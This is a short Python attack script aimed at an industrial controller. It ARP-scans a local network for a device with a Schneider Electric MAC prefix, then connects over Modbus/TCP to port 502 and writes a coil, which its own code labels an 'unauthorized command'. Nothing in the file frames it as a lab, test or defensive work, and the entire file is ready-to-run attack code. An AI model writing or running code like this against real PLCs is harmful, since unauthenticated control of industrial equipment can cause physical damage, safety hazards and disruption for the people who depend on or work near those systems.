from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import sys

def find_plc_ip():
    # Define the IP range to scan (adjust as needed)
    ip_range = "192.168.1.1/24"
    print(f"Scanning network {ip_range} for the PLC...")

    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find the PLC (assuming it's the only Schneider device)
    plc_ip = None
    for sent, received in result:
        # Check for Schneider Electric MAC address prefix (example: 00:80:9F)
        if received.hwsrc.startswith("00:80:9F"):
            plc_ip = received.psrc
            print(f"Found PLC at IP: {plc_ip}")
            break

    if not plc_ip:
        print("PLC not found in the network.")
        sys.exit(1)
    return plc_ip

def send_unauthorized_command(plc_ip):
    # Connect to the PLC using Modbus/TCP
    plc = ModbusClient(host=plc_ip, port=502, auto_open=True)
    if not plc.is_open():
        print("Failed to connect to the PLC.")
        sys.exit(1)

    # Define an unauthorized command (e.g., write to a coil to trigger an action)
    coil_address = 0  # Adjust this to the actual coil address
    value = 1  # Turn on the coil

    print(f"Sending unauthorized command to PLC at {plc_ip}: Write coil {coil_address} with value {value}.")
    try:
        plc.write_single_coil(coil_address, value)
        print("Command sent successfully.")
    except Exception as e:
        print(f"Failed to send command: {e}")
    finally:
        plc.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    send_unauthorized_command(plc_ip)